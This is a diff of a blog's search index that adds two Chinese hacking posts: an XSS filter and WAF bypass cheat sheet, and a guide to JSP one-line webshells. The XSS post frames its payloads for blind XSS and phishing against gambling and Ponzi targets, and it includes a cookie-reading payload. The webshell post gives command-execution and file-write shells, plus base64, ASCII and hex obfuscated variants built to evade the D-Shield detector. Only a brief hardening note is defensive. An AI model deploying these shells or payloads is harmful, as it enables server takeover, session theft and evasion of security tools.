@@ -1769,7 +1769,12 @@
   <entry>
     <title>XSS绕过总结/XSS命令总结</title>
     <url>/2020/11/22/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h3 id="一：正常构造方式："><a href="#一：正常构造方式：" class="headerlink" title="一：正常构造方式："></a>一：正常构造方式：</h3><p>1、无过滤，直接写：<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+    <content><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>乙方公司可能设计到资金盘目标，境外bc目标。在前后台数据交互中，很容易产生这种xss。往往后端的这种输出是没有过滤的。只要在前台的输入点上没有过滤的，后端基本上可以达到xss盲打的效果。以及xss去构造钓鱼攻击链。</p>
+<p>xss常见编码：</p>
+<p>1、html实体编码（十进制和十六进制）</p>
+<p>2、url编码 window.open(“javascript:%61%6c%65%72%74%28%31%29”)chrome阻止弹出网页窗口</p>
+<p>3、base64编码</p>
+<h3 id="0x02-正题"><a href="#0x02-正题" class="headerlink" title="0x02 正题"></a>0x02 正题</h3><h3 id="一：正常构造方式："><a href="#一：正常构造方式：" class="headerlink" title="一：正常构造方式："></a>一：正常构造方式：</h3><p>1、无过滤，直接写：<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 <p>2、正常截断：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&#39;&gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
 
@@ -1841,7 +1846,16 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img&#x2F; \&#x2F;\μ src&#x3D;x onerror&#x3D;alert(1)&#x2F;&#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;\x17\x17 onerror&#x3D;alert(1)&#x2F;&#x2F;&gt;</span><br><span class="line">&lt;img&#x2F;\%20src&#x3D;%17y%17 onerror&#x3D;%C2%A0alert(1)&#x2F;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>9、过滤括号和分号<br>你可以使用花括号来进行语句隔离，将onerror整体放入花括号中。这样就避免了使用分号：<br><code>&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;</code></p>
-<h3 id="三：常见的waf-bypass"><a href="#三：常见的waf-bypass" class="headerlink" title="三：常见的waf bypass"></a>三：常见的waf bypass</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CopyWAF名称：Cloudflare</span><br><span class="line">Payload：&lt;a”&#x2F;onclick&#x3D;(confirm)()&gt;click</span><br><span class="line">绕过技术：非空格填充</span><br><span class="line"></span><br><span class="line">WAF名称：Wordfence</span><br><span class="line">Payload：&lt;a&#x2F;href&#x3D;javascript&amp;colon;alert()&gt;click</span><br><span class="line">绕过技术：数字字符编码</span><br><span class="line"></span><br><span class="line">WAF名称：Barracuda</span><br><span class="line">Payload：&lt;a&#x2F;href&#x3D;&amp;#74;ava%0a%0d%09script&amp;colon;alert()&gt;click</span><br><span class="line">绕过技术：数字字符编码</span><br><span class="line"></span><br><span class="line">WAF名称：Akamai</span><br><span class="line">Payload：&lt;d3v&#x2F;onauxclick&#x3D;[2].some(confirm)&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：Comodo</span><br><span class="line">Payload：&lt;d3v&#x2F;onauxclick&#x3D;(((confirm)))“&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：F5</span><br><span class="line">Payload：&lt;d3v&#x2F;onmouseleave&#x3D;[2].some(confirm)&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：ModSecurity</span><br><span class="line">Payload：&lt;details&#x2F;open&#x2F;ontoggle&#x3D;alert()&gt;</span><br><span class="line">绕过技术：黑名单中缺少标签或事件处理器</span><br><span class="line"></span><br><span class="line">WAF名称：dotdefender</span><br><span class="line">Payload：&lt;details&#x2F;open&#x2F;ontoggle&#x3D;(confirm)()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
+<h3 id="三、-非常规html构造xsspayload"><a href="#三、-非常规html构造xsspayload" class="headerlink" title="三、 非常规html构造xsspayload"></a>三、 非常规html构造xsspayload</h3><p>1、’tabindex’或者’contenteditable,任何html元素都可以通过’tabindex’或’contenteditable’进行聚焦；</p>
+<p>2、‘contenteditable’是一个枚举属性，表示元素是否可以被用户编辑。如果可以，浏览器会修改元素的部件以允许编辑。这两个都导致onfocus事件自动触发</p>
+<p>3、user-modify，该属性在chrome下适用</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wafbypass</span> <span class="attr">tabindex</span>=<span class="string">"1"</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;/<span class="name">wafbypass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wafbypass2</span> <span class="attr">onfocus</span>=<span class="string">"alert(123)"</span> <span class="attr">autofocus</span> <span class="attr">contenteditable</span>=&gt;</span><span class="tag">&lt;/<span class="name">wafbypass2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wafbypass3</span> <span class="attr">style</span>=<span class="string">"-webkit-user-modify: read-write"</span> <span class="attr">onfocus</span>=<span class="string">"alert(document.cookie)"</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;/<span class="name">wafbypass3</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>on标签也可以做一些手脚 比如onblur</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xxx</span>/<span class="attr">tabindex</span>=<span class="string">1%20onblur</span>=<span class="string">alert</span>`<span class="attr">1</span>`%<span class="attr">20autofocus</span>&gt;</span></span><br><span class="line">self["alert"](1)</span><br><span class="line">self["\x61\x6c\x65\x72\x74"](1)</span><br><span class="line">(2).some(alert)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/22/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/image-20201207120531088.png" alt="image-20201207120531088"></p>
+<h3 id="四：常见的waf-bypass"><a href="#四：常见的waf-bypass" class="headerlink" title="四：常见的waf bypass"></a>四：常见的waf bypass</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CopyWAF名称：Cloudflare</span><br><span class="line">Payload：&lt;a”&#x2F;onclick&#x3D;(confirm)()&gt;click</span><br><span class="line">绕过技术：非空格填充</span><br><span class="line"></span><br><span class="line">WAF名称：Wordfence</span><br><span class="line">Payload：&lt;a&#x2F;href&#x3D;javascript&amp;colon;alert()&gt;click</span><br><span class="line">绕过技术：数字字符编码</span><br><span class="line"></span><br><span class="line">WAF名称：Barracuda</span><br><span class="line">Payload：&lt;a&#x2F;href&#x3D;&amp;#74;ava%0a%0d%09script&amp;colon;alert()&gt;click</span><br><span class="line">绕过技术：数字字符编码</span><br><span class="line"></span><br><span class="line">WAF名称：Akamai</span><br><span class="line">Payload：&lt;d3v&#x2F;onauxclick&#x3D;[2].some(confirm)&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：Comodo</span><br><span class="line">Payload：&lt;d3v&#x2F;onauxclick&#x3D;(((confirm)))“&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：F5</span><br><span class="line">Payload：&lt;d3v&#x2F;onmouseleave&#x3D;[2].some(confirm)&gt;click</span><br><span class="line">绕过技术：黑名单中缺少事件处理器以及函数调用混淆</span><br><span class="line"></span><br><span class="line">WAF名称：ModSecurity</span><br><span class="line">Payload：&lt;details&#x2F;open&#x2F;ontoggle&#x3D;alert()&gt;</span><br><span class="line">绕过技术：黑名单中缺少标签或事件处理器</span><br><span class="line"></span><br><span class="line">WAF名称：dotdefender</span><br><span class="line">Payload：&lt;details&#x2F;open&#x2F;ontoggle&#x3D;(confirm)()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
     <title>XSS绕过总结/XSS绕过总结</title>
@@ -2719,6 +2733,244 @@
 <p>2、子域名也许没有采用cdn</p>
 <p>3、各地ping</p>
 <p>4、观察ip变化</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>jsp一句话木马/jsp一句话木马</title>
+    <url>/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    为了java，系统总结一下jsp一句话！</p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>​    直接开始，从最初级的执行系统命令</p>
+<h3 id="一：-执行系统命令"><a href="#一：-执行系统命令" class="headerlink" title="一： 执行系统命令"></a>一： 执行系统命令</h3><p>​    无回显：（执行之后不会回显，直接弹shell）</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">"p"</span>));%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    有回显：（外带密码验证的）</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">	<span class="keyword">if</span>(<span class="string">"v1rus"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">"p"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.print(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其实上述的代码可能会在实际windows操作系统中带来乱码的问题，所以在文件头上加上这两句话可以解决jsp的乱码问题</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;GBK&quot;%&gt;</span><br><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;gb2312&quot;%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201208111458239.png" alt="image-20201208111458239"></p>
+<p>再详细说一下这里的参数：</p>
+<p>​        <code>Runtime</code> 类封装了运行时的环境。每个 Java 应用程序都有一个 <code>Runtime</code> 类实例，使应用程序能够与其运行的环境相连接。使用 <code>getRuntime()</code> 构建 <code>Runtime</code> 类实例。 <code>getRuntime()</code> 返回与当前 Java 应用程序相关的运行时对象。获取实例后调用 <code>exec()</code> 方法执行系统命令。</p>
+<p>  <code>request</code> 为 JSP 内置对象，<code>getParameter()</code> 方法获取请求参数 <code>cmd</code>的值构建命令 。</p>
+<h3 id="二、把字符串编码后写入指定文件的："><a href="#二、把字符串编码后写入指定文件的：" class="headerlink" title="二、把字符串编码后写入指定文件的："></a>二、把字符串编码后写入指定文件的：</h3><p>1、</p>
+<p>①写入绝对路径:</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.FileOutputStream(request.getParameter(<span class="string">"f"</span>)).wirte(request.getParameter(<span class="string">"c"</span>).getBytes());%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>请求：<a href="http://localhost:8081/shell/cmd4.jsp?f=D://v1rus.txt&amp;c=v1rus" target="_blank" rel="noopener">http://localhost:8081/shell/cmd4.jsp?f=D://v1rus.txt&amp;c=v1rus</a></p>
+<p>②写入web目录</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">"/"</span>)+<span class="string">"/"</span>+request.getParameter(<span class="string">"f"</span>)).write(request.getParameter(<span class="string">"c"</span>).getBytes());%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>请求：<a href="http://localhost:8081/shell/cmd5.jsp?f=2.txt&amp;c=v1rus" target="_blank" rel="noopener">http://localhost:8081/shell/cmd5.jsp?f=2.txt&amp;c=v1rus</a></p>
+<p>2、</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.RandomAccessFile(request.getParameter(<span class="string">"f"</span>),<span class="string">"rw"</span>).write(request.getParameter(<span class="string">"c"</span>).getBytes()); %&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.RandomAccessFile(application.getRealPath(<span class="string">"/"</span>)+<span class="string">"/"</span>+request.getParameter(<span class="string">"f"</span>),<span class="string">"rw"</span>).write(request.getParameter(<span class="string">"c"</span>).getBytes()); %&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="四、-反射调用外部jar包"><a href="#四、-反射调用外部jar包" class="headerlink" title="四、 反射调用外部jar包"></a>四、 反射调用外部jar包</h3><p><strong>jar -cvf 【打包后的文件名】.jar 【要打包的目录】。</strong></p>
+<h2 id="0x03-免杀！"><a href="#0x03-免杀！" class="headerlink" title="0x03 免杀！"></a>0x03 免杀！</h2><h3 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h3><p>​    学习冰蝎作者利用二进制加密实现新型的一句话木马。对于类加载是直接传送二进制的字节码（<strong>动态解析</strong>）。</p>
+<p>​    java执行代码的时候要先编译成.class字节码的文件才能被jvm所执行。如果实现任意class文件的加载，相当于实现了php中eval命令执行函数。</p>
+<p>​    我这里先贴实现的代码，等会再讲目前没办法实现的事。</p>
+<p>首先命令执行类Calc</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> obfuscate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"OK"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主运行程序类Loader</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> obfuscate;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Loader</span> </span>&#123;</span><br><span class="line">    <span class="comment">//实现二进制文件转成base64</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encodeBase64File</span><span class="params">(String path)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(path);;</span><br><span class="line">        FileInputStream inputFile = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[(<span class="keyword">int</span>) file.length()];</span><br><span class="line">        inputFile.read(buffer);</span><br><span class="line">        inputFile.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> BASE64Encoder().encode(buffer);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Myloader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> //继承<span class="title">ClassLoader</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span>  Class <span class="title">get</span><span class="params">(<span class="keyword">byte</span>[] b)</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            String classStr=<span class="string">"yv66vgAAADQAKQoACQAZCgAaABsIABwKABoAHQcAHgoABQAfCAAgBwAhBwAiAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABBMb2JmdXNjYXRlL0NhbGM7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAeAQAKU291cmNlRmlsZQEACUNhbGMuamF2YQwACgALBwAjDAAkACUBAAhjYWxjLmV4ZQwAJgAnAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAKAALAQACT0sBAA5vYmZ1c2NhdGUvQ2FsYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEACAAJAAAAAAACAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAABAAOAAAADAABAAAABQAPABAAAAABABEAEgABAAwAAABtAAIAAgAAABS4AAISA7YABFenAAhMK7YABhIHsAABAAAACQAMAAUAAwANAAAAFgAFAAAACAAJAAsADAAJAA0ACgARAAwADgAAABYAAgANAAQAEwAUAAEAAAAUAA8AEAAAABUAAAAHAAJMBwAWBAABABcAAAACABg="</span>; <span class="comment">// Calc.class的base64编码</span></span><br><span class="line">            BASE64Decoder code=<span class="keyword">new</span> sun.misc.BASE64Decoder();</span><br><span class="line">            String re = encodeBase64File(<span class="string">"E:\\ideaworkspace\\Obfuscate\\out\\production\\Obfuscate\\obfuscate\\Calc.class"</span>);</span><br><span class="line">            <span class="comment">//System.out.println(re);</span></span><br><span class="line">            Class result=<span class="keyword">new</span> Myloader().get(code.decodeBuffer(classStr));<span class="comment">//将base64解码成byte数组，并传入t类的get函数</span></span><br><span class="line">            System.out.println(result.newInstance().toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以成功弹出计算机</p>
+<p><img src="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-20201208163725862.png" alt="image-20201208163725862"></p>
+<p>​    </p>
+<p>​    这里后面有想过缩短.class文件的二进制直接构造一个类写静态块代码执行。</p>
+<p>​    但是其实可以看<code>Class result=new Myloader().get(code.decodeBuffer(classStr));</code>，这里生成的是Class类，不能强转为Calc类所以也不会执行静态代码块里面的内容，只能重写toString方法完成<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code></p>
+<h3 id="过d盾"><a href="#过d盾" class="headerlink" title="过d盾"></a>过d盾</h3><p>这里先贴一下jsp的基本用法和过d盾</p>
+<h4 id="JSP标签"><a href="#JSP标签" class="headerlink" title="JSP标签"></a>JSP标签</h4><p>在JSP页面中嵌入java代码，首先要了解一下JSP标签的基本知识。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ %&gt;    页面指令，设定页面属性和特征信息</span><br><span class="line">&lt;% %&gt;     java代码片段，不能在此声明方法</span><br><span class="line">&lt;%! %&gt;    java代码声明，声明全局变量或当前页面的方法</span><br><span class="line">&lt;%&#x3D; %&gt;    Java表达式</span><br></pre></td></tr></table></figure>
+
+
+
+<p>base64免杀过d盾</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"sun.misc.BASE64Decoder"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">"cmd"</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        BASE64Decoder decoder = <span class="keyword">new</span> BASE64Decoder();</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"amF2YS5sYW5nLlJ1bnRpbWU="</span>)));<span class="comment">//java.lang.Runtime</span></span><br><span class="line">        Process e = (Process) <span class="comment">//exec  getRuntime</span></span><br><span class="line">                rt.getMethod(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"ZXhlYw=="</span>)), String<span class="class">.<span class="keyword">class</span>).<span class="title">invoke</span>(<span class="title">rt</span>.<span class="title">getMethod</span>(<span class="title">new</span></span></span><br><span class="line">                        String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new</span><br><span class="line">                        Object[]&#123;&#125;), request.getParameter(<span class="string">"cmd"</span>) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>同理可以使用hex和ascii的编码绕过</p>
+<p>ascii</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span>  language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">"cmd"</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter("cmd") );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125;out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>hex</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> <span class="keyword">import</span>=<span class="string">"javax.xml.bind.DatatypeConverter"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">"cmd"</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(DatatypeConverter.parseHexBinary(<span class="string">"6a6176612e6c616e672e52756e74696d65"</span>)));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(DatatypeConverter.parseHexBinary("65786563")), String.class).invoke(rt.getMethod(new String(DatatypeConverter.parseHexBinary("67657452756e74696d65"))).invoke(null), request.getParameter("cmd") );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125;out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x04-冰蝎分析"><a href="#0x04-冰蝎分析" class="headerlink" title="0x04 冰蝎分析"></a>0x04 冰蝎分析</h2><p>​    上述的其实已经对冰蝎的思路有了一个铺垫，再详细学习一点冰蝎的内部实现。</p>
+<p>​    作者定义了一个类t继承classloader，调用时返回父类的defineClass方法，就解决了protected的限制，返回解析后的Class。当然也可以用反射的方法动态加载二进制加密数据。</p>
+<p>​    因为利用的是动态二进制的加密 ，所以需要class文件的动态生成，不能每次都去编译。所以涉及到了java的asm框架。ASM 可以直接产生二进制 class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为，也就是动态修改class文件中的属性值。</p>
+<p><img src="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/2020.png" alt></p>
+<p>需要执行的命令是编码在class文件中的，因为class是已编译好的文件。但不能每次执行命令时都编译payload，那么就需要payload可以接收参数。为了参数被waf拦截，自然也是二进制流，所以作者使用ASM框架来动态修改class文件中的属性值。从上面的代码就可以看出，只需要向getParamedClass方法传递payload类名、参数列表即可获得经过参数化的payload class。</p>
+<h2 id="0x05-安全防范"><a href="#0x05-安全防范" class="headerlink" title="0x05 安全防范"></a>0x05 安全防范</h2><p>前提条件是：你的 Java Web 应用没有在 Jsp 中直接使用任何 Java 代码，否则会对应用本身造成影响。</p>
+<p>方法：</p>
+<p>在 web.xml 文件中加下以下配置：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;jsp-config&gt;</span><br><span class="line"></span><br><span class="line">	&lt;jsp-property-group&gt;</span><br><span class="line"></span><br><span class="line">		&lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">		&lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">		&lt;scripting-invalid&gt;true&lt;/scripting-invalid&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/jsp-property-group&gt;</span><br><span class="line"></span><br><span class="line">&lt;/jsp-config&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>配置生效后，将不允许 Jsp/Jspx 文件中包含任何 scripting，包括：</p>
+<ol>
+<li>&lt;%%&gt; 与 <a href="jsp:scriptlet">jsp:scriptlet</a></li>
+<li>&lt;%!%&gt; 与 <a href="jsp:declaration">jsp:declaration</a></li>
+<li>&lt;%=%&gt; 与 <a href="jsp:expression">jsp:expression</a></li>
+</ol>
+<p><a href="https://zgao.top/" target="_blank" rel="noopener">https://zgao.top/</a></p>
+<p><a href="https://xz.aliyun.com/t/2744" target="_blank" rel="noopener">https://xz.aliyun.com/t/2744</a></p>
+]]></content>
+  </entry>
+  <entry>
